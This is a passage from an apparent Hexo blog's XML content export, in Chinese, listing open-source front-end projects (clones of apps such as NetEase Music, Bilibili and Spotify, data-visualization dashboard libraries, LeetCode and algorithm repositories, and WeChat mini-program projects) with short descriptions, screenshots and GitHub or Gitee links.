data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656909926543-d4719358-fbbd-4bdf-8559-0500d4f140cf.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/sl1673495/vue-netease-music">https://github.com/sl1673495/vue-netease-music</a></p><h2 id="3-高仿网易云-Mac-客户端（React）"><a href="#3-高仿网易云-Mac-客户端（React）" class="headerlink" title="3. 高仿网易云 Mac 客户端（React）"></a>3. 高仿网易云 Mac 客户端（React）</h2><p>一个基于 React、TypeScript 的高仿网易云 mac 客户端播放器。使用 React Hook 做状态管理，没有使用额外的数据管理库。除此之外，还使用到了 CSS Modules、Webpack、Graphql 等技术。</p><p>该项目实现了登录&#x2F;登出、发现页、每日歌曲推荐页、全部歌单页、最新音乐页、歌单详情页、音乐播放详情页、播放记录、搜索、创建和收藏的歌单列表等功能。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656909465499-0809e4df-e4c4-4e45-982f-014dce9e97ad.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656909465499-0809e4df-e4c4-4e45-982f-014dce9e97ad.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/uniquemo/react-netease-music">https://github.com/uniquemo/react-netease-music</a></p><h2 id="4-高仿-B-站（React）"><a href="#4-高仿-B-站（React）" class="headerlink" title="4. 高仿 B 站（React）"></a>4. 高仿 B 站（React）</h2><p>高仿 B 站 web 移动端，基于此<a href="https://github.com/dxx/react-ssr">SSR 服务端渲染</a>模板，使用 React 16.8，Typescript 开发，后端服务使用 Express 实现。</p><p>该项目实现了首页、分类页、排行榜、搜索、视频详情页、 UP 主页、个人中心、直播、直播列表、分类、直播间等功能。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/jpeg/1500604/1656909065232-0fdc989a-9002-4059-a17d-f700ca0d991e.jpeg?x-oss-process=image/resize,w_766,limit_0/interlace,1" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/jpeg/1500604/1656909065232-0fdc989a-9002-4059-a17d-f700ca0d991e.jpeg?x-oss-process=image/resize,w_766,limit_0/interlace,1" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/dxx/react-bilibili">https://github.com/dxx/react-bilibili</a></p><h2 id="5-高仿掘金（Vue）"><a href="#5-高仿掘金（Vue）" class="headerlink" title="5. 高仿掘金（Vue）"></a>5. 高仿掘金（Vue）</h2><p>高仿掘金，整合 vue + nuxt + axios + vuex + vue-router (nuxt 自带 vuex 和 vue-router)，是一个基于 Nuxt 的服务器端渲染 Demo。</p><p>该项目实现了服务器端渲染、静态页面部署、掘金首页、掘金推荐列表、掘金小册、滚动分页加载、不同端的布局适配等功能。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1656909260989-35a72774-b69d-4f00-95a5-db1732c0fc61.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1656909260989-35a72774-b69d-4f00-95a5-db1732c0fc61.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/xuqiang521/nuxt-ssr-demo">https://github.com/xuqiang521/nuxt-ssr-demo</a></p><h2 id="6-高仿饿了么（Vue）"><a href="#6-高仿饿了么（Vue）" class="headerlink" title="6. 高仿饿了么（Vue）"></a>6. 高仿饿了么（Vue）</h2><p>一个基于 vue2 + vuex + vue-router + webpack + ES6&#x2F;7 + fetch + sass + flex + svg 构建的具有 45 个页面的仿饿了么的大型单页面应用，舒注册、登录、商品展示、购物车、下单等功能。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656936873473-0e51e023-5747-40fd-9dba-f4b3c921eeb6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656936873473-0e51e023-5747-40fd-9dba-f4b3c921eeb6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/bailicangdu/vue2-elm">https://github.com/bailicangdu/vue2-elm</a></p><h2 id="7-高仿微信（Vue-）"><a href="#7-高仿微信（Vue-）" class="headerlink" title="7. 高仿微信（Vue ）"></a>7. 高仿微信（Vue ）</h2><p>一个基于 Vue.js2.0 高仿微信 App 的单页应用，使用 Vue.js2.0 框架，搭配样式库<a href="https://weui.io/">WeUI</a>，模仿微信 app 的样式和交互。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1656910095137-87a55a63-c06d-474b-990e-a6d3b954546c.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1656910095137-87a55a63-c06d-474b-990e-a6d3b954546c.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/zhaohaodang/vue-WeChat">https://github.com/zhaohaodang/vue-WeChat</a></p><h2 id="8-高仿-Instagram（React）"><a href="#8-高仿-Instagram（React）" class="headerlink" title="8. 高仿 Instagram（React）"></a>8. 高仿 Instagram（React）</h2><p>一个仿 Instagram 项目，前端使用 React、状态管理使用 Redux、路由使用 React Router、表格管理使用 Formik、动画使用 React Spring、Websocket 管理使用 Socket.io、后端使用 Express、数据库使用 MongoDB。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656910578892-6d1cf891-df66-4d15-a6a4-9e89550c52de.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656910578892-6d1cf891-df66-4d15-a6a4-9e89550c52de.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/Sandermoen/instaclone">https://github.com/Sandermoen/instaclone</a></p><h2 id="9-高仿-Stackoverflow（React）"><a href="#9-高仿-Stackoverflow（React）" class="headerlink" title="9. 高仿 Stackoverflow（React）"></a>9. 高仿 Stackoverflow（React）</h2><p>这个项目是 Stackoverflow 的一个简化版的全栈克隆。使用 ReactJs、NextJs、Storybook、PostCSS、NodeJs、Express、MongoDB、Mongoose 等技术实现。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656910801831-4edef2f9-416f-43d3-b25b-4224a7be5157.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656910801831-4edef2f9-416f-43d3-b25b-4224a7be5157.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/salihozdemir/stackoverflow-clone">https://github.com/salihozdemir/stackoverflow-clone</a></p><h2 id="10-高仿-Spotify（React）"><a href="#10-高仿-Spotify（React）" class="headerlink" title="10. 高仿 Spotify（React）"></a>10. 高仿 Spotify（React）</h2><p>一个 Spotify Web 播放器的前端克隆项目。使用 React (create-react-app CLI)、react-router-dom、axios 等技术实现。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656910949143-4ccb577d-fcaf-47d4-9e6b-6c77b1e88f4e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656910949143-4ccb577d-fcaf-47d4-9e6b-6c77b1e88f4e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Giuhub：</strong><a href="https://github.com/JL978/spotify-clone-client">https://github.com/JL978/spotify-clone-client</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 高仿 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据可视化大屏项目</title>
      <link href="/2023/06/30/frontend/collection/projects/shu-ju-ke-shi-hua-da-ping-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/shu-ju-ke-shi-hua-da-ping-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="DataV"><a href="#DataV" class="headerlink" title="DataV"></a>DataV</h2><p>DataV 是一个基于 Vue 的数据可视化组件库，Vue 数据可视化组件库（类似阿里 DataV，大屏数据展示），提供 SVG 的边框及装饰、图表、水位图、飞线图等组件，简单易用，长期更新。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660671923273-4a7155fd-5907-48d2-9c2e-54ec04013c54.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660671923273-4a7155fd-5907-48d2-9c2e-54ec04013c54.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github</strong>：<a href="https://github.com/DataV-Team/DataV">https://github.com/DataV-Team/DataV</a></p><h2 id="DataV-React"><a href="#DataV-React" class="headerlink" title="DataV-React"></a>DataV-React</h2><p>DataV-React 是一个基于<strong>React</strong>的数据可视化组件库(类似阿里 DataV，大屏数据展示），提供 SVG 的边框及装饰、图表、水位图、飞线图等组件，简单易用，长期更新。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672023603-1f39cde4-3c10-4066-aacb-dad3ad46c1c0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672023603-1f39cde4-3c10-4066-aacb-dad3ad46c1c0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github</strong>：<a href="https://github.com/DataV-Team/DataV-React">https://github.com/DataV-Team/DataV-React</a></p><h2 id="iDataV"><a href="#iDataV" class="headerlink" title="iDataV"></a>iDataV</h2><p>大屏数据可视化案例。包含了很多现成的模板，可在这些不同风格的模板基础上快速开始一个可视化大屏项目。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672175589-166430e4-bceb-4836-9179-423619ed0edc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672175589-166430e4-bceb-4836-9179-423619ed0edc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github</strong>：<a href="https://github.com/yyhsong/iDataV">https://github.com/yyhsong/iDataV</a></p><h2 id="DataEase"><a href="#DataEase" class="headerlink" title="DataEase"></a>DataEase</h2><p>DataEase 是开源的数据可视化分析工具，帮助用户快速分析数据并洞察业务趋势，从而实现业务的改进与优化。DataEase 支持丰富的数据源连接，能够通过拖拉拽方式快速制作图表，并可以方便的与他人分享。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672281042-9ba04119-d9b9-41c5-82ee-3a0a21d9245b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672281042-9ba04119-d9b9-41c5-82ee-3a0a21d9245b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github</strong>：<a href="https://github.com/dataease/dataease">https://github.com/dataease/dataease</a></p><h2 id="FlyFish"><a href="#FlyFish" class="headerlink" title="FlyFish"></a>FlyFish</h2><p>飞鱼（FlyFish）是一个数据可视化编码平台。通过简易的方式快速创建数据模型，通过拖拉拽的形式，快速生成一套数据可视化解决方案。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672328891-8813e8ee-a13d-4fb1-9efd-68ffb56d3d5d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672328891-8813e8ee-a13d-4fb1-9efd-68ffb56d3d5d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github</strong>：<a href="https://github.com/CloudWise-OpenSource/FlyFish">https://github.com/CloudWise-OpenSource/FlyFish</a></p><h2 id="GoView"><a href="#GoView" class="headerlink" title="GoView"></a>GoView</h2><p>GoView 是一个高效的拖拽式低代码数据可视化开发平台，将图表或页面元素封装为基础组件，无需编写代码即可制作数据大屏，减少心智负担。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672578323-e9e8e635-5959-4e27-8e19-9cd7a9713de5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672578323-e9e8e635-5959-4e27-8e19-9cd7a9713de5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Gitee</strong>：<a href="https://gitee.com/MTrun/go-view">https://gitee.com/MTrun/go-view</a></p><h2 id="vue-big-screen"><a href="#vue-big-screen" class="headerlink" title="vue-big-screen"></a>vue-big-screen</h2><p>一个基于 Vue、Datav、Echart 框架的 “ <strong>数据大屏项目</strong> “，通过 Vue 组件实现数据动态刷新渲染，内部图表可实现自由替换。部分图表使用 DataV 自带组件，可进行更改，</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672557887-85eb9700-1943-4347-afa4-dc3039bf1623.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672557887-85eb9700-1943-4347-afa4-dc3039bf1623.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Gitee：</strong><a href="https://gitee.com/MTrun/big-screen-vue-datav">https://gitee.com/MTrun/big-screen-vue-datav</a></p><h2 id="react-big-screen"><a href="#react-big-screen" class="headerlink" title="react-big-screen"></a>react-big-screen</h2><p>一个基于 React、Dva、DataV、ECharts 框架的 “ <strong>数据大屏项目</strong> “。支持数据动态刷新渲染、屏幕适配、数据请求模拟、局部样式、图表自由替换&#x2F;复用等功能。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672637487-cbae8f03-a5af-43d6-8d15-e838f37151d0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660672637487-cbae8f03-a5af-43d6-8d15-e838f37151d0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Gitee：</strong><a href="https://gitee.com/MTrun/react-big-screen">https://gitee.com/MTrun/react-big-screen</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 可视化大屏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与算法</title>
      <link href="/2023/06/30/frontend/collection/projects/shu-ju-jie-gou-yu-suan-fa/"/>
      <url>/2023/06/30/frontend/collection/projects/shu-ju-jie-gou-yu-suan-fa/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="LeetCode-Master"><a href="#LeetCode-Master" class="headerlink" title="LeetCode Master"></a>LeetCode Master</h2><p>代码随想题录，LeetCode 刷题攻略，200 道经典刷题顺序，共 60w 字的详细指导图解，视频难点剖析，50 余张思维图，支持 C++，Java，Python，Go，JavaScript 等多语言版本。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667061577592-b470e3b9-1a8d-47e7-bb87-c616143e1d22.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667061577592-b470e3b9-1a8d-47e7-bb87-c616143e1d22.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️32.8k）：</strong><a href="https://github.com/youngyangyang04/leetcode-master">https://github.com/youngyangyang04/leetcode-master</a></p><h2 id="JavaScript-算法和数据结构"><a href="#JavaScript-算法和数据结构" class="headerlink" title="JavaScript 算法和数据结构"></a>JavaScript 算法和数据结构</h2><p>Github 上最火的 JavaScript 描述的算法和数据结构项目，每种算法和数据结构都有自己的 README，包含相关说明和链接，提供了中文版本。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667060668095-4dd470c4-2e55-4844-a5d8-783e3ad1e119.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667060668095-4dd470c4-2e55-4844-a5d8-783e3ad1e119.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️154k）：</strong><a href="https://github.com/trekhleb/javascript-algorithms">https://github.com/trekhleb/javascript-algorithms</a></p><h2 id="Algorithm-Visualizer"><a href="#Algorithm-Visualizer" class="headerlink" title="Algorithm Visualizer"></a>Algorithm Visualizer</h2><p>Algorithm Visualizer 是一个交互式在线平台，可以从代码中可视化算法。目前支持的算法包括回溯法、加密算法、动态规划、图搜索、贪婪算法、搜索算法、排序算法等。当选择算法时，中间就会动态演示执行过程，日志输出区记录每一步的执行结果。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667060905004-3c3f9422-3829-4ce6-abc4-d6971646846f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667060905004-3c3f9422-3829-4ce6-abc4-d6971646846f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️39.3k）：</strong><a href="https://github.com/algorithm-visualizer/algorithm-visualizer">https://github.com/algorithm-visualizer/algorithm-visualizer</a></p><h2 id="Leetcode"><a href="#Leetcode" class="headerlink" title="Leetcode"></a>Leetcode</h2><p>本项目包含 LeetCode、《剑指 Offer（第 2 版）》、《剑指 Offer（专项突击版）》、《程序员面试金典（第 6 版）》等题目的相关题解。所有题解均由多种编程语言实现，包括但不限于：Java、Python、C++、Go、TypeScript、Rust。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667061830304-77b63fc8-88e9-4922-8b2c-1fed2ec13abc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667061830304-77b63fc8-88e9-4922-8b2c-1fed2ec13abc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️32.8k）：</strong><a href="https://github.com/doocs/leetcode">https://github.com/doocs/leetcode</a></p><h2 id="LeetCode-JavaScript"><a href="#LeetCode-JavaScript" class="headerlink" title="LeetCode JavaScript"></a>LeetCode JavaScript</h2><p>前端攻城狮从零入门算法的宝藏题库，根据知名算法老师的经验总结了 100+ 道 LeetCode 力扣的经典题型 JavaScript 题解和思路。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667061908091-664e89ae-876b-4be6-a36c-07f67575b12c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667061908091-664e89ae-876b-4be6-a36c-07f67575b12c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️1.6k）：</strong><a href="https://github.com/sl1673495/leetcode-javascript">https://github.com/sl1673495/leetcode-javascript</a></p><h2 id="labuladong-的算法小抄"><a href="#labuladong-的算法小抄" class="headerlink" title="labuladong 的算法小抄**"></a>labuladong 的算法小抄**</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667062225852-51aa1a67-6fc5-4ae3-a62c-2d0bf0ee8ef4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667062225852-51aa1a67-6fc5-4ae3-a62c-2d0bf0ee8ef4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️111k）：</strong><a href="https://github.com/labuladong/fucking-algorithm">https://github.com/labuladong/fucking-algorithm</a></p><h2 id="LeetcodeTop"><a href="#LeetcodeTop" class="headerlink" title="LeetcodeTop"></a>LeetcodeTop</h2><p>codeTop 上汇总了各大互联网公司容易考察的高频 leetcode 题，支持按照公司、部门、岗位组合查询。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667062403784-9c161476-bbcf-47f8-85d3-0c55ba04511e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1667062403784-9c161476-bbcf-47f8-85d3-0c55ba04511e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️15.6k）：</strong><a href="https://github.com/afatcoder/LeetcodeTop">https://github.com/afatcoder/LeetcodeTop</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序项目</title>
      <link href="/2023/06/30/frontend/collection/projects/wei-xin-xiao-cheng-xu-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/wei-xin-xiao-cheng-xu-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="wechat-app-mall"><a href="#wechat-app-mall" class="headerlink" title="wechat-app-mall"></a>wechat-app-mall</h2><p>wechat-app-mall 是一个微信小程序商城、微信小程序微店。其具有以下功能：<br />● 基于云接口及自动化后台管理，无需部署后台及服务器资源；<br />● 商品展示、单商品多规格配置单独的库存和价格；<br />● 基于小程序 Storage 接口的购物车功能；<br />● 订单管理；<br />● 小程序在线支付；<br />● 物流跟踪管理；</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662815739281-dc34fbb0-29e3-49d1-81d7-d287723936f4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662815739281-dc34fbb0-29e3-49d1-81d7-d287723936f4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 16.2k）：</strong><a href="https://github.com/EastWorld/wechat-app-mall">https://github.com/EastWorld/wechat-app-mall</a></p><h2 id="vant-weapp"><a href="#vant-weapp" class="headerlink" title="vant-weapp"></a>vant-weapp</h2><p>Vant 是一个轻量、可靠的移动端组件库，于 2017 年开源。目前 Vant 官方提供了 <a href="https://vant-contrib.gitee.io/vant/v2">Vue 2 版本</a>、<a href="https://vant-contrib.gitee.io/vant">Vue 3 版本</a>和<a href="http://vant-contrib.gitee.io/vant-weapp">微信小程序版本</a>，并由社区团队维护 <a href="https://github.com/3lang3/react-vant">React 版本</a>和<a href="https://github.com/ant-move/Vant-Aliapp">支付宝小程序版本</a>。</p><p><img 